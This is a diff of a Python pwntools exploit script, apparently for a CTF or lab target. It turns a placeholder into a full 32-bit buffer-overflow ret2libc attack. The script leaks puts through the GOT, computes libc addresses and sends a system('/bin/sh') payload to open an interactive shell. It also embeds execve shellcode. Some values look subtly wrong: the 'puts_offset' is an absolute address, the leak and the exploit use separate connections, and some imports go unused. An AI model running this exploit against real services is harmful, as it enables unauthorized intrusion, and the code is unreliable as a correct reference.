@@ -1,56 +1,72 @@
 from pwn import *
+import json
+import requests
 
-# Target information
-target_ip = '192.168.0.155'
-target_port = 9000
+# Target configuration
+remote_ip = '192.168.1.138'
+remote_port = 9000
 
-# Offsets based on identified libc version
-offset_puts = 0x5fcb0
-offset_system = 0x3adb0
-offset_str_bin_sh = 0x15bb0b  # Adjust based on the exact libc version
-offset_exit = 0x2e9e0
-offset_mprotect = 0xe2ea0
+# Static configuration based on binary analysis
+buffer_size = 132
+plt_puts = 0x8048340
+plt_gets = 0x08048330
+main_address = 0x804847b
+got_puts = 0x80497ac
+got_gets = 0x80497a8
 
-# Connect to the target
-conn = remote(target_ip, target_port)
+# Offsets for the version of libc used by the target (example values, adjust for your target)
+puts_offset = 0xb75f9cb0
+system_offset = 0x3adb0
+exit_offset = 0x2e9e0
+bin_sh_offset = 0x15bb2b
 
-# Function to leak an address; implement as per your actual leaking strategy
-def leak_address():
-    # This is a placeholder function. You need to replace it with the actual code that
-    # sends the necessary payload to leak the address and reads it back.
-    # Example:
-    # conn.sendline(payload)
-    # leaked_address = unpack(conn.recv(4), 'all', endian='little', sign=False)
-    # return leaked_address
-    pass
+# Example shellcode: execve("/bin/sh", NULL, NULL)
+shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
-# Leak addresses (example placeholders)
-leaked_puts_address = leak_address()  # Actual implementation needed
-libc_base_address = leaked_puts_address - offset_puts
+def leak_address(target_ip, target_port, got_address):
+    conn = remote(target_ip, target_port)
+    
+    # Create payload to leak address via puts
+    payload = flat([
+        b"A" * buffer_size,
+        p32(plt_puts),
+        p32(main_address),
+        p32(got_address),
+    ], word_size=32)
 
-# Calculate libc function addresses dynamically
-system_addr = libc_base_address + offset_system
-bin_sh_addr = libc_base_address + offset_str_bin_sh
-exit_addr = libc_base_address + offset_exit
-mprotect_addr = libc_base_address + offset_mprotect
+    conn.sendline(payload)
 
-# Craft your shellcode here (placeholder)
-shellcode = b"\x90" * 100  # NOP sled, replace with actual shellcode for reverse shell
+    # Skip lines to read the leaked address
+    conn.recvlines(6)  # Adjust based on how many lines are before the leak
+    leaked_address = u32(conn.recvn(4))
+    conn.close()
 
-# Construct the payload to modify memory protections and execute shellcode
-# This is highly dependent on your exploitation strategy and the specifics of the target
-payload = flat([
-    b"A" * buffer_overflow_offset,  # Adjust this offset to reach the return address
-    p32(mprotect_addr),
-    p32(bin_sh_addr),  # Return into system("/bin/sh") as an example, adjust as necessary
-    p32(libc_base_address),  # Argument 1 to mprotect (base address)
-    p32(0x1000),  # Argument 2 to mprotect (length)
-    p32(0x7),     # Argument 3 to mprotect (protections: RWX)
-    shellcode
-], word_size=32)
+    return leaked_address
 
-# Send the final payload
-conn.sendline(payload)
+def exploit(target_ip, target_port):
+    # Leak the address of puts from the GOT to calculate libc base
+    puts_leaked = leak_address(target_ip, target_port, got_puts)
+    libc_base = puts_leaked - puts_offset
 
-# Switch to interactive mode
-conn.interactive()
+    # Calculate the addresses of system, exit, and "/bin/sh" within libc
+    system_addr = libc_base + system_offset
+    exit_addr = libc_base + exit_offset
+    bin_sh_addr = libc_base + bin_sh_offset
+
+    # Prepare the payload to spawn a shell using the system function
+    payload = flat([
+        b"B" * buffer_size,  # Adjust this size to match the overflow point
+        p32(system_addr),
+        p32(exit_addr),
+        p32(bin_sh_addr),
+    ], word_size=32)
+
+    # Send the payload
+    conn = remote(target_ip, target_port)
+    conn.sendline(payload)
+
+    # Hand over control to the user
+    conn.interactive()
+
+if __name__ == "__main__":
+    exploit(remote_ip, remote_port)
